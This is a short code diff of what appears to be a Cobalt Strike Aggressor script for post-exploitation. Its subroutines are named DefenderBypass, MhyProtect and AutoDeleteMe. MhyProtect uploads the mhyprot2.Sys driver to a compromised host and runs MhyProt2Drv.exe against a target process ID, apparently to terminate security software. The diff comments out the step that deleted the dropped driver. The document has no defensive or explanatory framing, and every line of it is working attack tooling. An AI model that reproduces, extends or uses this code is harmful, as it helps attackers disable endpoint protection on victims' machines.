@@ -6,8 +6,10 @@ sub DefenderBypass{
 }
 sub MhyProtect{
     bupload($bid,script_resource("bin/mhyprot2.Sys"));
+
+    #bupload_raw($bid,"c:\\windows\\temp\\mhyprot2.Sys",script_resource("bin/mhyprot2.Sys"));
     bexecute_assembly($bid, script_resource("bin/MhyProt2Drv.exe"), "$3['pid']");
-    brm($bid,"mhyprot2.Sys");
+    # brm($bid,"mhyprot2.Sys");
 
 }
 sub AutoDeleteMe{
